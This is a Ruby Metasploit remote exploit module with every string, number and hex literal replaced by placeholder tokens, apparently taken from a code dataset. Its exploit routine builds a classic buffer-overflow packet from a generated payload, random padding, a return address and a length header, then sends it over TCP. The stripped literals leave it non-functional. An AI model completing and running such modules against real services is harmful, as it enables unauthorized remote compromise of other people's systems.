require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> + ( <hex> .. <hex> ) . to_a . pack ( <str> ) , <str> = > true , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <hex> , <str> = > <str> } ] , [ <str> , { <str> = > <int> , <str> = > <hex> , <str> = > <str> } ] ] , <str> = > true , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def exploit connect payload . encoder . datastore . import_options_from_hash ( { <str> = > target [ <str> ] } ) my_payload = payload . generate sploit = my_payload sploit << rand_text ( target [ <str> ] - my_payload . length ) sploit << [ target . ret ] . pack ( <str> ) pkt = <str> pkt << [ sploit . length / <int> ] . pack ( <str> ) pkt << [ sploit . length % <int> ] . pack ( <str> ) pkt << sploit print_status ( <str> target . name <str> ) sock . put ( pkt ) handler disconnect end end 
